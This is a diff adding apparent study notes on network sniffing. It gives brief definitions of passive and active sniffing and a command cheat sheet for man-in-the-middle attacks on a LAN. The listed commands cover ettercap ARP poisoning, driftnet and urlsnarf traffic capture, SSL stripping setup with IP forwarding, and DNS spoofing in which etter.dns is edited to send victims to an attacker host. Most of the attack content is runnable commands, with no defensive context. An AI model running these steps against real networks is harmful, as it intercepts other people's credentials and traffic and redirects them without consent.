@@ -1,0 +1,49 @@
+
+#-------------------------Sniffing------------------------#
+
+Sniffing:-
+--------------
+Sniffing is the process of scanning & monitoring of the captured data packets passing through a network using Sniffers. The process of sniffing is performed by using Promiscuous Ports. 
+
+Types Of Sniffing-
+--------------------------
+	1. Active Sniffing
+	2. Passive Sniffing
+
+The Attackers can capture packets like Syslog traffic, DNS traffic, Web traffic, Email & other types of data traffic flowing across the network.
+By capturing these packets, an attacker can reveal information such as data, username & passwords from the protocols such as HTTP, POP3, IMAP, SMTP, NMTP, FTP, Telnet & Rlogin and other information.
+
+
+Passive Sniffing:-
+-------------------------
+Passive Sniffing is the sniffing type in which there is no need of sending additional packets or interfering the device such as Hub to recieve packets. 
+
+Active Sniffing:-
+------------------------
+Active Sniffing is the sniffing type in which attacker has to send additional packets to the connected device such as Switch to start recieving packets. 
+Attackers uses certain techniques such as MAC Flooding, DHCP Attacks, DNS Poisoning, Switch Port Stealing, ARP Poisoning & Spoofing to monitor traffic passing through the switch.
+
+Content Sniffing-
+ettercap -Tqi wlan0 -M arp:remote ///
+driftnet -i wlan0
+
+Save Content-
+driftnet -i wlan0 -d  /root/newfoldername
+
+URL Sniffing-
+ettercap -G
+urlsnarf -i wlan0
+
+SSL Striping-
+sysctl -w net.ipv4.ip_forward=1 
+ettercap -G
+tcpdump -i eth0 -n port 80 and host targetIP
+
+DNS Spoofing-
+leafpad /etc/ettercap/etter.conf ------- on Linux Services
+service apache2 start
+ifconfig
+leafpad /etc/ettercap/etter.dns -------- Change domain name and set attacker host ip
+ettercap -G
+target1 is a victim host and target2 is a default gateway
+go plugin and enable the dns.spoofing
